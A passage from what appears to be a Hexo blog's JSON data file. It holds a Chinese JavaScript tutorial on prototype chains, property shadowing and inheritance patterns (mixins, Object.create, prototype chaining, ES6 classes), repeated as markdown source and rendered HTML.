\"__proto__\", {\n    get: function() {\n        return Object.getPrototypeOf( this );\n    },\n    set: function(o) {\n        Object.setPrototypeOf(this, o);\n        return o;\n    }\n});\n```\n\n可使用 `Object.getPrototypeOf()`、`Object.setPrototypeOf()` 替代\n\n### 5、实现继承的几种方式\n\n##### 5.1 使用混入方式实现继承\n\n```js\nfunction mixin (sourceObj, targetObj) {\n    for (let k in sourceObj) {\n        if (!targetObj[k]) {\n            targetObj[k] = sourceObj[k];\n        }\n    }\n    return targetObj;\n}\n\nvar Person = {\n    name: 'nobody',\n    showName () {\n        console.log(this.name);\n    }\n}\n\nvar stu = mixin(Person, {\n    name: 'xxb',\n    age: 24,\n    showAge () {\n        console.log(this.age);\n    }\n})\nstu.showName();\n```\n\n##### 5.2 使用对象委托实现继承\n\n```js\nvar Person = {\n    init (name) {\n        this.name = name;\n    },\n    showName () {\n        console.log(this.name);\n    }\n};\n\nvar Student = Object.create(Person);\n\nStudent.init = function (name, age) {\n    Person.init.call(this, name);\n    this.age = age;\n};\nStudent.showAge = function () {\n    console.log(this.age);\n};\n\nvar stu = Object.create(Student);\nstu.init('xxb', 24);\nstu.showName();\n\n\n// `Object.create()` 会创建一个新对象并把它关联到指定的对象就可以充分发挥 [[Prototype]] 机制的作用（委托），\n// 并且避免不必要的麻烦（如使用 `new` 的构造函数调用会生成 `.prototype` 和 `.constructor` 引用）。\n\n// `Object.create() `没有其他副作用，ES6添加了辅助函数 `Object.setPrototypeOf()` ，用以实现同样的功能\n```\n\n##### 5.3 使用原型链继承\n\n```js\nfunction Person (name) {\n    this.name = name;\n}\nPerson.prototype.showName = function () {\n    console.log(this.name);\n}\n\nfunction Student (name, age) {\n    Person.call(this, name);\n    this.age = age;\n}\n\nStudent.prototype = Object.create(Person.prototype);\nStudent.prototype.constructor = Student;\nStudent.prototype.showAge = function () {\n    console.log(this.age);\n}\n\nvar stu = new Student('xxb', 24);\nstu.showName();\n\n\n// 如果使用 `Student.prototype = Person.prototype` 并不会创建一个关联到 `Student.prototype` 的新对象，\n// 它只是让 `Student.prototype` 直接引用 `Person.prototype` 对象。\n// 因此当执行类似 `Student.prototype.show = ... ` 的赋值语句时会直接修改 `Person.prototype` 对象本身。\n// 显然这不是想要的结果，否则根本不需要 `Student` 对象，直接使用 `Person` 就行了。\n\n// 如果使用 `Student.prototype = new Person()` 的确会创建一个关联到 `Student.prototype` 的新对象。\n// 但是它使用了 `Person()` 的“构造函数调用”，如果函数 `Person` 有一些副作用（比如给 this 添加数据属性、修改状态、注册到其他对象等）的话，就会影响到 `Student()` 的“后代”\n```\n\n##### 5.4 使用 class 实现继承\n\n```js\n// 使用 es6 的 `class` 实现继承\nclass Person {\n    constructor (name) {\n        this.name = name;\n    }\n    showName () {\n        console.log(this.name);\n    }\n}\n\nclass Student extends Person {\n    constructor (name, age) {\n        super(name);\n        this.age = age;\n    }\n    showAge () {\n        console.log(this.age);\n    }\n}\n\nvar stu = new Student('xxb', 24);\nstu.showAge();\n```\n\n**class 的优点：**\n1. 不需要引用 `.prototype` 对象；\n2. 不需要通过 `Object.create()` 来替换 `.prototype` 对象，也不需要设置 `.__proto__` 或者 `Object.setPrototypeOf()` 来指定原型链；\n3. 可以通过 `super()` 来实现相对多态，这样任何方法都可以引用原型链上层的同名方法。\n4. `class` 字面语法不能声明属性（只能声明方法），避免原型链末端的“实例”可能会意外地获取 其他地方的属性；\n5. 可以通过 `extends` 很自然地扩展对象（子）类型，甚至是内置的对象（子）类型。\n   \n**class 的缺点：**\n1. class 基本上只是现有 `[[Prototype]]` 委托机制的一种语法糖。即 class 并不会像传统面向类的语言一样在声明时静态复制所有行为。如果无意修改或者替换了父“类”中的一个方法，那子“类”和所有实例都会受到影响，因为它们在定义时并没有进行复制，只是使用基于 `[[Prototype]]` 的实时委托。\n2. 用 class 定义看上去不能被修改（静态），实际上依然可以被修改（动态）\n3. 不能定义属性，只能往 `prototype` 上添加，但这样违背了 `class` 语法的本意，在实现中暴露了 `.prototype`\n4. 出于性能考虑， `super` 并不像 `this` 一样是晚绑定（动态绑定）的，它会在创建时静态绑定。\n\n```js\n// `super` 的静态绑定\nclass P {\n    foo () {\n        console.log('P.foo');\n    }\n}\nclass C extends P {}\n\nvar c1 = new C();\nc1.foo(); // \"P.foo\"\n\nvar D = {\n    foo: function() {\n        console.log( \"D.foo\" );\n    }\n};\nvar E = {\n    foo: C.prototype.foo\n};\n\nObject.setPrototypeOf(E, D); // 把 E 委托到 D\nE.foo(); // \"P.foo\"\n```\n\n\n**相关方法：**\n* `Object.create()`：创建一个对象并把这个对象的 `[[Prototype]]` 关联到指定的对象\n* `Object.setPrototypeOf()`：设置一个指定的对象的原型 ( 即内部`[[Prototype]]`属性）到另一个对象或 `null`\n* `Object.getPrototypeOf()`：返回指定对象的原型（即内部 `[[Prototype]]` 属性的值）\n* `Object.defineProperty()`：在一个对象上定义一个新属性，或者修改一个对象的现有属性\n* `Object.prototype.hasOwnproperty()`：返回一个布尔值，指示对象是否具有指定的属性作为自身（不继承）属性\n* `Object.prototype.isPrototypeOf()`：测试一个对象是否存在于另一个对象的原型链上，与 `instanceof` 作用类似\n* `fon ... in ...`：以任意顺序遍历一个对象的可枚举属性（包括原型链上的属性，主要用于 Object 对象）\n* `fon ... of ...`：在可迭代对象(包括 `Array`, `Map`, `Set`, `String`, `arguments` 对象等)上创建一个迭代循环，遍历每个属性值\n\n\n相关文章\n[JavaScript 继承](https://github.com/ljianshu/Blog/issues/20)","source":"_posts/JavaScript/原型链与继承.md","raw":"---\ntitle: 原型链与继承\ncategories: JavaScript\ntags: [JavaScript 基础]\ndate: 2021-04-27 20:24:48\n---\n\n# 原型链与继承\n\n### 1、原型链\n\n在面向类的语言中，类可以被复制（或实例化）多次，实例化（或者继承）一个类就意味着“把类的 行为复制到物理对象中”，对于每一个新实例来说都会重复这个过程。\n\n在 JavaScript 中，并没有类似的复制机制。Javascript 中不能创建一个类的多个实例，只能创建多个对象，它们的 `[[Prototype]]` 关联的是同一个对象，这样一个对象就可以通过委托访问另一个对象的属性和函数。\n\nJavaScript 中父类和子类的关系只存在于两者构造函数对应的 `.prototype` 对象中，它们的构造函数之间并不存在直接联系\n\nJavaScript 中的函数无法真正地复制，只能复制对共享函数对象的引用，JavaScript 对象有一个特殊的 `[[Prototype]]` 内置属性，其实就是对于其他对象的引用。几乎所有的对象在创建时 `[[Prototype]]` 属性都会被赋予一个非空的值。\n\n函数本身并不是构造函数，然而，当在普通的函数调用前面加上 `new` 关键字之后，就会把这个函数调用变成一个“构造函数 调用”。实际上， `new` 会劫持所有普通函数并用构造对象的形式来调用它。在 JavaScript 中对于“构造函数”最准确的解释是，所有带 `new` 的函数调用。\n\n`new Foo()` 这个函数调用实际上并没有直接创建关联，这个关联只是一个意外的副作用（新创建的对象添加了 `__proto__` 属性）， `new Foo()` 只是间接完成了目标：一个关联到其他对象的新对象。更直接的方式是使用 `Object.create(...)`。\n\nJavaScript 的 `[[Prototype]]` 机制本质上就是行为委托机制：`[[Prototype]]` 存在于对象中的一个内部链接，它会引用其他对象。通常来说，这个链接的作用是：如果在对象上没有找到需要的属性或者方法引用，引擎就会继续在 `[[Prototype]]` 关联的对象上进行查找。同理，如果在后者中也没有找到需要的引用就会继续查找它的 `[[Prototype]`] ，以此类推。这一系列对象的链接被称为“原型链”。\n\n```js\nfunction Foo(name) {\n    this.name = name;\n}\nFoo.prototype.myName = function() {\n    return this.name;\n};\nvar a = new Foo( \"a\" );\nvar b = new Foo( \"b\" );\na.myName(); // \"a\"\nb.myName(); // \"b\"\na.constructor === Foo // true\n\n// 看起来创建 `a` 和 `b` 时会把 `Foo.prototype` 对象复制到这两个对象中，然而事实并不是这样，\n// 在创建的过程中， `a` 和 `b` 的内部 [[Prototype]] 都会关联到 `Foo.prototype` 上。\n// 当 `a` 和 `b` 中无法找到 `myName` 时，它会在 `Foo.prototype` 上找到。\n\n// 看起来 `a.constructor === Foo` 为真意味着 `a` 确实有一个指向 `Foo` 的 `.constructor` 属性，\n// 但是事实不是这样，实际上， `.constructor` 引用同样被委托给了 `Foo.prototype` ，而`Foo.prototype.constructor` 默认指向 `Foo`\n```\n\n### 2、属性遍历\n\n使用 `for...in` 遍历对象时原理和查找 `[[Prototype]]` 链类似，任何可以通过原型链访问到且 `enumerable: true` 的属性都会被枚举。使用 `in` 操作符检查属性在对象中是否存在时，也会查找对象的整条原型链（无论属性是否可枚举）\n\n```js\nvar obj = {\n    name: 'xxb'\n};\n\nObject.defineProperty(obj, 'age', {\n    age: 24,\n    enumerable: false\n})\n\nfor (let key in obj) {\n    console.log(key);\n}\n\nconsole.log('age' in obj);\nconsole.log('toString' in obj);\n```\n\n### 3、属性设置与屏蔽\n\n在于原型链上层时 obj.foo = \"bar\" 会出现的三种情况。\n1. 如果在 [[Prototype]] 链上层存在名为 foo 的普通数据访问属性并且 writable: true ，那就会直接在 obj 中添加一个名为 foo 的新属性，它是屏蔽属性。\n2. 如果在 [[Prototype]] 链上层存在 foo ，但 writable:false，那么无法修改已有属性或者在 obj 上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。总之，不会发生屏蔽。\n3. 如果在 [[Prototype]] 链上层存在 foo 并且它是一个 setter，那就一定会调用这个 setter。 foo 不会被添加到obj ，也不会重新定义 foo 这个 setter。\n   \n> [[Prototype]] 链上层的只读属性会阻止 [[Prototype]] 链下层隐式创建（屏蔽）同名属性。这样做主要是为了模拟类属性的继承，比如父类的属性只读级别，则子类的属性应该不高于只读级别。\n\n> 解决第2、3种情况可使用 Object.defineProperty() , 而不是使用 = 赋值\n\n```js\n// 情形1 生成屏蔽属性\nvar parent = {\n    name: 'aaaa'\n};\n\nvar son = Object.create(parent);\nson.name = 'bbbb';\n\nconsole.log(son.name);\n```\n\n```js\n// 情形2 赋值时报错\nvar parent = {};\nObject.defineProperty(parent, 'name', {\n    value: 'aaa',\n    writable: false\n})\n\nvar son = Object.create(parent);\nson.name = 'bbbb';  // TypeError: Cannot assign to read only property 'name' of object '#<Object>'\n```\n\n```js\n// 情形3 赋值失败并执行 `set()`\nvar parent = {};\nObject.defineProperty(parent, 'name', {\n    set () {\n        console.log('set');\n    }\n})\n\nvar son = Object.create(parent);\nson.name = 'bbbb';  \n\nconsole.log(son.name);\n\n// ----- output -----\n// set\n// undefined\n```\n### 4、__proto__ 属性\n\n浏览器支持一种非标准的方法来访问内部 `[[Prototype]]` 属性， `.__proto__` 的实现大致如下：\n\n```js\nObject.defineProperty(Object.prototype, \"__proto__\", {\n    get: function() {\n        return Object.getPrototypeOf( this );\n    },\n    set: function(o) {\n        Object.setPrototypeOf(this, o);\n        return o;\n    }\n});\n```\n\n可使用 `Object.getPrototypeOf()`、`Object.setPrototypeOf()` 替代\n\n### 5、实现继承的几种方式\n\n##### 5.1 使用混入方式实现继承\n\n```js\nfunction mixin (sourceObj, targetObj) {\n    for (let k in sourceObj) {\n        if (!targetObj[k]) {\n            targetObj[k] = sourceObj[k];\n        }\n    }\n    return targetObj;\n}\n\nvar Person = {\n    name: 'nobody',\n    showName () {\n        console.log(this.name);\n    }\n}\n\nvar stu = mixin(Person, {\n    name: 'xxb',\n    age: 24,\n    showAge () {\n        console.log(this.age);\n    }\n})\nstu.showName();\n```\n\n##### 5.2 使用对象委托实现继承\n\n```js\nvar Person = {\n    init (name) {\n        this.name = name;\n    },\n    showName () {\n        console.log(this.name);\n    }\n};\n\nvar Student = Object.create(Person);\n\nStudent.init = function (name, age) {\n    Person.init.call(this, name);\n    this.age = age;\n};\nStudent.showAge = function () {\n    console.log(this.age);\n};\n\nvar stu = Object.create(Student);\nstu.init('xxb', 24);\nstu.showName();\n\n\n// `Object.create()` 会创建一个新对象并把它关联到指定的对象就可以充分发挥 [[Prototype]] 机制的作用（委托），\n// 并且避免不必要的麻烦（如使用 `new` 的构造函数调用会生成 `.prototype` 和 `.constructor` 引用）。\n\n// `Object.create() `没有其他副作用，ES6添加了辅助函数 `Object.setPrototypeOf()` ，用以实现同样的功能\n```\n\n##### 5.3 使用原型链继承\n\n```js\nfunction Person (name) {\n    this.name = name;\n}\nPerson.prototype.showName = function () {\n    console.log(this.name);\n}\n\nfunction Student (name, age) {\n    Person.call(this, name);\n    this.age = age;\n}\n\nStudent.prototype = Object.create(Person.prototype);\nStudent.prototype.constructor = Student;\nStudent.prototype.showAge = function () {\n    console.log(this.age);\n}\n\nvar stu = new Student('xxb', 24);\nstu.showName();\n\n\n// 如果使用 `Student.prototype = Person.prototype` 并不会创建一个关联到 `Student.prototype` 的新对象，\n// 它只是让 `Student.prototype` 直接引用 `Person.prototype` 对象。\n// 因此当执行类似 `Student.prototype.show = ... ` 的赋值语句时会直接修改 `Person.prototype` 对象本身。\n// 显然这不是想要的结果，否则根本不需要 `Student` 对象，直接使用 `Person` 就行了。\n\n// 如果使用 `Student.prototype = new Person()` 的确会创建一个关联到 `Student.prototype` 的新对象。\n// 但是它使用了 `Person()` 的“构造函数调用”，如果函数 `Person` 有一些副作用（比如给 this 添加数据属性、修改状态、注册到其他对象等）的话，就会影响到 `Student()` 的“后代”\n```\n\n##### 5.4 使用 class 实现继承\n\n```js\n// 使用 es6 的 `class` 实现继承\nclass Person {\n    constructor (name) {\n        this.name = name;\n    }\n    showName () {\n        console.log(this.name);\n    }\n}\n\nclass Student extends Person {\n    constructor (name, age) {\n        super(name);\n        this.age = age;\n    }\n    showAge () {\n        console.log(this.age);\n    }\n}\n\nvar stu = new Student('xxb', 24);\nstu.showAge();\n```\n\n**class 的优点：**\n1. 不需要引用 `.prototype` 对象；\n2. 不需要通过 `Object.create()` 来替换 `.prototype` 对象，也不需要设置 `.__proto__` 或者 `Object.setPrototypeOf()` 来指定原型链；\n3. 可以通过 `super()` 来实现相对多态，这样任何方法都可以引用原型链上层的同名方法。\n4. `class` 字面语法不能声明属性（只能声明方法），避免原型链末端的“实例”可能会意外地获取 其他地方的属性；\n5. 可以通过 `extends` 很自然地扩展对象（子）类型，甚至是内置的对象（子）类型。\n   \n**class 的缺点：**\n1. class 基本上只是现有 `[[Prototype]]` 委托机制的一种语法糖。即 class 并不会像传统面向类的语言一样在声明时静态复制所有行为。如果无意修改或者替换了父“类”中的一个方法，那子“类”和所有实例都会受到影响，因为它们在定义时并没有进行复制，只是使用基于 `[[Prototype]]` 的实时委托。\n2. 用 class 定义看上去不能被修改（静态），实际上依然可以被修改（动态）\n3. 不能定义属性，只能往 `prototype` 上添加，但这样违背了 `class` 语法的本意，在实现中暴露了 `.prototype`\n4. 出于性能考虑， `super` 并不像 `this` 一样是晚绑定（动态绑定）的，它会在创建时静态绑定。\n\n```js\n// `super` 的静态绑定\nclass P {\n    foo () {\n        console.log('P.foo');\n    }\n}\nclass C extends P {}\n\nvar c1 = new C();\nc1.foo(); // \"P.foo\"\n\nvar D = {\n    foo: function() {\n        console.log( \"D.foo\" );\n    }\n};\nvar E = {\n    foo: C.prototype.foo\n};\n\nObject.setPrototypeOf(E, D); // 把 E 委托到 D\nE.foo(); // \"P.foo\"\n```\n\n\n**相关方法：**\n* `Object.create()`：创建一个对象并把这个对象的 `[[Prototype]]` 关联到指定的对象\n* `Object.setPrototypeOf()`：设置一个指定的对象的原型 ( 即内部`[[Prototype]]`属性）到另一个对象或 `null`\n* `Object.getPrototypeOf()`：返回指定对象的原型（即内部 `[[Prototype]]` 属性的值）\n* `Object.defineProperty()`：在一个对象上定义一个新属性，或者修改一个对象的现有属性\n* `Object.prototype.hasOwnproperty()`：返回一个布尔值，指示对象是否具有指定的属性作为自身（不继承）属性\n* `Object.prototype.isPrototypeOf()`：测试一个对象是否存在于另一个对象的原型链上，与 `instanceof` 作用类似\n* `fon ... in ...`：以任意顺序遍历一个对象的可枚举属性（包括原型链上的属性，主要用于 Object 对象）\n* `fon ... of ...`：在可迭代对象(包括 `Array`, `Map`, `Set`, `String`, `arguments` 对象等)上创建一个迭代循环，遍历每个属性值\n\n\n相关文章\n[JavaScript 继承](https://github.com/ljianshu/Blog/issues/20)","slug":"JavaScript/原型链与继承","published":1,"updated":"2021-05-11T02:41:54.358Z","_id":"cko3yr62n0003io6r2zu5etvx","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"原型链与继承\"><a href=\"#原型链与继承\" class=\"headerlink\" title=\"原型链与继承\"></a>原型链与继承</h1><h3 id=\"1、原型链\"><a href=\"#1、原型链\" class=\"headerlink\" title=\"1、原型链\"></a>1、原型链</h3><p>在面向类的语言中，类可以被复制（或实例化）多次，实例化（或者继承）一个类就意味着“把类的 行为复制到物理对象中”，对于每一个新实例来说都会重复这个过程。</p>\n<p>在 JavaScript 中，并没有类似的复制机制。Javascript 中不能创建一个类的多个实例，只能创建多个对象，它们的 <code>[[Prototype]]</code> 关联的是同一个对象，这样一个对象就可以通过委托访问另一个对象的属性和函数。</p>\n<p>JavaScript 中父类和子类的关系只存在于两者构造函数对应的 <code>.prototype</code> 对象中，它们的构造函数之间并不存在直接联系</p>\n<p>JavaScript 中的函数无法真正地复制，只能复制对共享函数对象的引用，JavaScript 对象有一个特殊的 <code>[[Prototype]]</code> 内置属性，其实就是对于其他对象的引用。几乎所有的对象在创建时 <code>[[Prototype]]</code> 属性都会被赋予一个非空的值。</p>\n<p>函数本身并不是构造函数，然而，当在普通的函数调用前面加上 <code>new</code> 关键字之后，就会把这个函数调用变成一个“构造函数 调用”。实际上， <code>new</code> 会劫持所有普通函数并用构造对象的形式来调用它。在 JavaScript 中对于“构造函数”最准确的解释是，所有带 <code>new</code> 的函数调用。</p>\n<p><code>new Foo()</code> 这个函数调用实际上并没有直接创建关联，这个关联只是一个意外的副作用（新创建的对象添加了 <code>__proto__</code> 属性）， <code>new Foo()</code> 只是间接完成了目标：一个关联到其他对象的新对象。更直接的方式是使用 <code>Object.create(...)</code>。</p>\n<p>JavaScript 的 <code>[[Prototype]]</code> 机制本质上就是行为委托机制：<code>[[Prototype]]</code> 存在于对象中的一个内部链接，它会引用其他对象。通常来说，这个链接的作用是：如果在对象上没有找到需要的属性或者方法引用，引擎就会继续在 <code>[[Prototype]]</code> 关联的对象上进行查找。同理，如果在后者中也没有找到需要的引用就会继续查找它的 <code>[[Prototype]</code>] ，以此类推。这一系列对象的链接被称为“原型链”。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">Foo</span>(<span class=\"params\">name</span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.name = name;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">Foo.prototype.myName = <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">this</span>.name;</span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"keyword\">new</span> Foo( <span class=\"string\">&quot;a&quot;</span> );</span><br><span class=\"line\"><span class=\"keyword\">var</span> b = <span class=\"keyword\">new</span> Foo( <span class=\"string\">&quot;b&quot;</span> );</span><br><span class=\"line\">a.myName(); <span class=\"comment\">// &quot;a&quot;</span></span><br><span class=\"line\">b.myName(); <span class=\"comment\">// &quot;b&quot;</span></span><br><span class=\"line\">a.constructor === Foo <span class=\"comment\">// true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 看起来创建 `a` 和 `b` 时会把 `Foo.prototype` 对象复制到这两个对象中，然而事实并不是这样，</span></span><br><span class=\"line\"><span class=\"comment\">// 在创建的过程中， `a` 和 `b` 的内部 [[Prototype]] 都会关联到 `Foo.prototype` 上。</span></span><br><span class=\"line\"><span class=\"comment\">// 当 `a` 和 `b` 中无法找到 `myName` 时，它会在 `Foo.prototype` 上找到。</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 看起来 `a.constructor === Foo` 为真意味着 `a` 确实有一个指向 `Foo` 的 `.constructor` 属性，</span></span><br><span class=\"line\"><span class=\"comment\">// 但是事实不是这样，实际上， `.constructor` 引用同样被委托给了 `Foo.prototype` ，而`Foo.prototype.constructor` 默认指向 `Foo`</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2、属性遍历\"><a href=\"#2、属性遍历\" class=\"headerlink\" title=\"2、属性遍历\"></a>2、属性遍历</h3><p>使用 <code>for...in</code> 遍历对象时原理和查找 <code>[[Prototype]]</code> 链类似，任何可以通过原型链访问到且 <code>enumerable: true</code> 的属性都会被枚举。使用 <code>in</code> 操作符检查属性在对象中是否存在时，也会查找对象的整条原型链（无论属性是否可枚举）</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> obj = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;xxb&#x27;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(obj, <span class=\"string\">&#x27;age&#x27;</span>, &#123;</span><br><span class=\"line\">    age: <span class=\"number\">24</span>,</span><br><span class=\"line\">    enumerable: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> key <span class=\"keyword\">in</span> obj) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">console</span>.log(key);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;age&#x27;</span> <span class=\"keyword\">in</span> obj);</span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;toString&#x27;</span> <span class=\"keyword\">in</span> obj);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3、属性设置与屏蔽\"><a href=\"#3、属性设置与屏蔽\" class=\"headerlink\" title=\"3、属性设置与屏蔽\"></a>3、属性设置与屏蔽</h3><p>在于原型链上层时 obj.foo = “bar” 会出现的三种情况。</p>\n<ol>\n<li>如果在 [[Prototype]] 链上层存在名为 foo 的普通数据访问属性并且 writable: true ，那就会直接在 obj 中添加一个名为 foo 的新属性，它是屏蔽属性。</li>\n<li>如果在 [[Prototype]] 链上层存在 foo ，但 writable:false，那么无法修改已有属性或者在 obj 上创建屏蔽属性。如果运行在严格模式下，代码会抛出一个错误。否则，这条赋值语句会被忽略。总之，不会发生屏蔽。</li>\n<li>如果在 [[Prototype]] 链上层存在 foo 并且它是一个 setter，那就一定会调用这个 setter。 foo 不会被添加到obj ，也不会重新定义 foo 这个 setter。</li>\n</ol>\n<blockquote>\n<p>[[Prototype]] 链上层的只读属性会阻止 [[Prototype]] 链下层隐式创建（屏蔽）同名属性。这样做主要是为了模拟类属性的继承，比如父类的属性只读级别，则子类的属性应该不高于只读级别。</p>\n</blockquote>\n<blockquote>\n<p>解决第2、3种情况可使用 Object.defineProperty() , 而不是使用 = 赋值</p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 情形1 生成屏蔽属性</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> parent = &#123;</span><br><span class=\"line\">    name: <span class=\"string\">&#x27;aaaa&#x27;</span></span><br><span class=\"line\">&#125;;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> son = <span class=\"built_in\">Object</span>.create(parent);</span><br><span class=\"line\">son.name = <span class=\"string\">&#x27;bbbb&#x27;</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son.name);</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 情形2 赋值时报错</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> parent = &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(parent, <span class=\"string\">&#x27;name&#x27;</span>, &#123;</span><br><span class=\"line\">    value: <span class=\"string\">&#x27;aaa&#x27;</span>,</span><br><span class=\"line\">    writable: <span class=\"literal\">false</span></span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> son = <span class=\"built_in\">Object</span>.create(parent);</span><br><span class=\"line\">son.name = <span class=\"string\">&#x27;bbbb&#x27;</span>;  <span class=\"comment\">// TypeError: Cannot assign to read only property &#x27;name&#x27; of object &#x27;#&lt;Object&gt;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 情形3 赋值失败并执行 `set()`</span></span><br><span class=\"line\"><span class=\"keyword\">var</span> parent = &#123;&#125;;</span><br><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(parent, <span class=\"string\">&#x27;name&#x27;</span>, &#123;</span><br><span class=\"line\">    set () &#123;</span><br><span class=\"line\">        <span class=\"built_in\">console</span>.log(<span class=\"string\">&#x27;set&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">var</span> son = <span class=\"built_in\">Object</span>.create(parent);</span><br><span class=\"line\">son.name = <span class=\"string\">&#x27;bbbb&#x27;</span>;  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">console</span>.log(son.name);</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// ----- output -----</span></span><br><span class=\"line\"><span class=\"comment\">// set</span></span><br><span class=\"line\"><span class=\"comment\">// undefined</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"4、proto-属性\"><a href=\"#4、proto-属性\" class=\"headerlink\" title=\"4、proto 属性\"></a>4、<strong>proto</strong> 属性</h3><p>浏览器支持一种非标准的方法来访问内部 <code>[[Prototype]]</code> 属性， <code>.__proto__</code> 的实现大致如下：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Object</span>.defineProperty(<span class=\"built_in\">Object</span>.prototype, <span class=\"string\">&quot;__proto__&quot;</span>, &#123;</span><br><span class=\"line\">    get: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">Object</span>.getPrototypeOf( <span class=\"built_in\">this</span> );</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    set: <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\">o</span>) </span>&#123;</span><br><span class=\"line\">        <span class=\"built_in\">Object</span>.setPrototypeOf(<span class=\"built_in\">this</span>, o);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> o;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;);</span><br></pre></td></tr></table></figure>\n\n<p>可使用 <code>Object.getPrototypeOf()</code>、<code>Object.setPrototypeOf()</code> 替代</p>\n<h3 id=\"5、实现继承的几种方式\"><a href=\"#5、实现继承的几种方式\" class=\"headerlink\" title=\"5、实现继承的几种方式\"></a>5、实现继承的几种方式</h3><h5 id=\"5-1-使用混入方式实现继承\"><a href=\"#5-1-使用混入方式实现继承\" class=\"headerlink\" title=\"5.1 使用混入方式实现继承\"></a>5.1 